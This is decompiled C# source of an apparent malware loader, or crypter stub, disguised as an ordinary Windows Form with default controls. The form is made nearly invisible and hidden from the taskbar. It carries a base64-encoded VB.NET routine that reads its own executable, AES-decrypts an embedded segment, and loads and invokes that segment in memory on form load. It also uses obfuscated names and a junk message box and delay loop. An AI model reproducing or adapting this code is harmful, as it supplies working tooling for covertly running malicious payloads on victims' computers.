using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Sam;

[DesignerGenerated]
public class Son : Form
{
	private static List<WeakReference> __ENCList;

	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	private static string XE;

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox2 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	[DebuggerNonUserCode]
	public Son()
	{
		Class5.SUi8phazhjLmk();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0664: Unknown result type (might be due to invalid IL or missing references)
		//IL_066e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Son));
		Button1 = new Button();
		Button2 = new Button();
		CheckBox1 = new CheckBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		LinkLabel1 = new LinkLabel();
		PictureBox1 = new PictureBox();
		PictureBox2 = new PictureBox();
		ProgressBar1 = new ProgressBar();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(415, 146);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(390, 98);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(1);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(319, 200);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(2);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(200, 212);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(325, 112);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Label2");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(353, 51);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(5);
		Label3.set_Text("Label3");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(242, 158);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(6);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		PictureBox pictureBox = PictureBox1;
		location = new Point(264, 52);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(100, 50);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(7);
		PictureBox1.set_TabStop(false);
		PictureBox pictureBox3 = PictureBox2;
		location = new Point(280, 200);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox4 = PictureBox2;
		size = new Size(100, 50);
		((Control)pictureBox4).set_Size(size);
		PictureBox2.set_TabIndex(8);
		PictureBox2.set_TabStop(false);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(258, 137);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(142, 18);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(9);
		TextBox textBox = TextBox1;
		location = new Point(270, 24);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(10);
		TextBox textBox3 = TextBox2;
		location = new Point(120, 142);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(11);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(187, 33);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Son");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static Son()
	{
		Class5.SUi8phazhjLmk();
		__ENCList = new List<WeakReference>();
		XE = Encoding.GetEncoding(1252).GetString(Convert.FromBase64String("SW1wb3J0cyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMNCkltcG9ydHMgU3lzdGVtDQpJbXBvcnRzIFN5c3RlbS5XaW5kb3dzLkZvcm1zDQpJbXBvcnRzIFN5c3RlbS5UZXh0DQpJbXBvcnRzIFN5c3RlbS5JTw0KSW1wb3J0cyBTeXN0ZW0uUmVmbGVjdGlvbg0KSW1wb3J0cyBTeXN0ZW0uU3RyaW5nDQpJbXBvcnRzIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucw0KSW1wb3J0cyBTeXN0ZW0uQ2hhcg0KSW1wb3J0cyBTeXN0ZW0uQ29sbGVjdGlvbnMNCkltcG9ydHMgU3lzdGVtLkNvbXBvbmVudE1vZGVsDQpJbXBvcnRzIFN5c3RlbS5EaWFnbm9zdGljcw0KSW1wb3J0cyBTeXN0ZW0uV2luZG93cw0KSW1wb3J0cyBTeXN0ZW0uRGF0YQ0KSW1wb3J0cyBNaWNyb3NvZnQuVmlzdWFsQmFzaWMNCk5hbWVzcGFjZSB6DQpDbGFzcyB6DQogICAgU2hhcmVkIFN1YiBtYWluKCkNCiAgICAgICAgeigpDQogICAgRW5kIFN1Yg0KDQogICAgU2hhcmVkIFN1YiB6KCkNCiAgICAgICAgRGltIHN0ckFycmF5IEFzIFN0cmluZygpID0gU3RyaW5ncy5TcGxpdChGaWxlLlJlYWRBbGxUZXh0KEFwcGxpY2F0aW9uLkV4ZWN1dGFibGVQYXRoKSwgIkxGNGpNWjFMQnAiLCAtMSwgQ29tcGFyZU1ldGhvZC5CaW5hcnkpDQogICAgICAgIERpbSBkbGwgQXMgQnl0ZSgpID0gQUVTX0RlY3J5cHQoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHN0ckFycmF5KDE4KSksIHN0ckFycmF5KDEpKQ0KICAgICAgICBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseS5Mb2FkKGRsbCkuR2V0VHlwZSgiQS5BIikuR2V0TWV0aG9kKCJBIikuSW52b2tlKE5vdGhpbmcsIE5ldyBPYmplY3QoKSB7fSkNCiAgICBFbmQgU3ViDQoNCiAgICANCiAgICBQdWJsaWMgU2hhcmVkIEZ1bmN0aW9uIEFFU19EZWNyeXB0KEJ5VmFsIGlucHV0IEFzIEJ5dGUoKSwgQnlWYWwgcGFzcyBBcyBTdHJpbmcpIEFzIEJ5dGUoKQ0KICAgICAgICBEaW0gQUVTIEFzIE5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZA0KICAgICAgICBEaW0gSGFzaF9BRVMgQXMgTmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyDQogICAgICAgIFRyeQ0KICAgICAgICAgICAgRGltIEhhc2goMzEpIEFzIEJ5dGUNCiAgICAgICAgICAgIERpbSB0ZW1wIEFzIEJ5dGUoKSA9IEhhc2hfQUVTLkNvbXB1dGVIYXNoKFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcuQVNDSUkuR2V0Qnl0ZXMocGFzcykpDQogICAgICAgICAgICBBcnJheS5Db3B5KHRlbXAsIDAsIEhhc2gsIDAsIDE2KQ0KICAgICAgICAgICAgQXJyYXkuQ29weSh0ZW1wLCAwLCBIYXNoLCAxNSwgMTYpDQogICAgICAgICAgICBBRVMuS2V5ID0gSGFzaA0KICAgICAgICAgICAgQUVTLk1vZGUgPSBTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZS5FQ0INCiAgICAgICAgICAgIERpbSBKT1k2IEFzIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuSUNyeXB0b1RyYW5zZm9ybSA9IEFFUy5DcmVhdGVEZWNyeXB0b3INCiAgICAgICAgICAgIERpbSBKT1k3IEFzIEJ5dGUoKSA9IGlucHV0DQogICAgICAgICAgICBSZXR1cm4gSk9ZNi5UcmFuc2Zvcm1GaW5hbEJsb2NrKEpPWTcsIDAsIEpPWTcuTGVuZ3RoKQ0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBGdW5jdGlvbg0KDQpFbmQgQ2xhc3MNCkVuZCBOYW1lc3BhY2U="));
	}

	private void wr3T3w6TV7n164kmq3jLa4IRGvPa()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("EG|a‡FN:KJ\u007fw6†$ˆ\\EG’#x‰.g0\u0090-‹6'\u00819v@;7AFo~4>uu$‡U,\u007fJ„MgX`Pn\u008dwH@B4C\u0090^Sf{p:‘k4‚Z4Lb<Z!+\u007f5Te=s~\\GbF]…)RwYS‚C.0…u");
		int num = 1;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 95623690);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Assembly assembly = uz.CompileSource(XE);
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass & type.FullName!.EndsWith(".z"))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
				OvEAp0r9wdTpDiurboen0zv3.ren_(type, RuntimeHelpers.GetObjectValue(objectValue));
			}
		}
	}
}
